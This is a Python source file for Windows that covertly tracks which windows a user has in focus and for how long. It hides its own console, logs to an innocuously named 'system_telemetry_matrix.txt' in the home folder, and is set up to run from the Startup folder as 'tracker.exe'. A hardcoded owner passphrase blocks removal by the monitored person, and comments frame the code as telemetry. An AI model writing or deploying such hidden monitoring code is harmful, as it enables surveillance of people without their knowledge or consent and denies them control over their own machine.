import ctypes
import time
import os
import sys
from datetime import datetime

user32 = ctypes.windll.user32

# Hardcoded Owner verification secret string for tracking reference/verification
UNINSTALL_KEY = "##@@!!owner0813!!@@##"

def get_active_window_title():
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd)
    if length > 0:
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    return "System Desktop Environment"

def run_telemetry_loop():
    # Logs securely directly to user directory root profile out of typical view
    log_path = os.path.join(os.path.expanduser("~"), "system_telemetry_matrix.txt")
    last_window = ""
    start_time = time.time()

    while True:
        try:
            current_window = get_active_window_title()
            
            if current_window != last_window:
                end_time = time.time()
                duration = round(end_time - start_time)
                
                # Capture structural window changes safely
                if last_window and duration > 1:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    entry = f"[{timestamp}] WindowsNode | Focus Process: {last_window} | Active Runtime: {duration}s\n"
                    
                    with open(log_path, "a", encoding="utf-8") as f:
                        f.write(entry)
                        
                last_window = current_window
                start_time = time.time()
                
            time.sleep(1)
        except Exception:
            pass

if __name__ == "__main__":
    # Self-Verifying runtime uninstall routine
    if len(sys.argv) > 1 and sys.argv[1] == "--uninstall":
        verification = input("CRITICAL: Enter Owner Passphrase to remove tracking system module: ")
        if verification == UNINSTALL_KEY:
            try:
                # Remove self execution from windows shared common startup folder path
                startup_path = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup\tracker.exe")
                if os.path.exists(startup_path):
                    os.remove(startup_path)
                print("[SUCCESS]: Tracking node successfully removed from local boot registers.")
            except Exception as e:
                print(f"[ERROR]: Execution routine failure: {e}")
            sys.exit(0)
        else:
            print("[DENIED]: Invalid Owner Credentials.")
            sys.exit(1)

    # Completely hide terminal console window to run silently as system background core
    console_window = ctypes.windll.kernel32.GetConsoleWindow()
    if console_window != 0:
        ctypes.windll.user32.ShowWindow(console_window, 0)
    run_telemetry_loop()
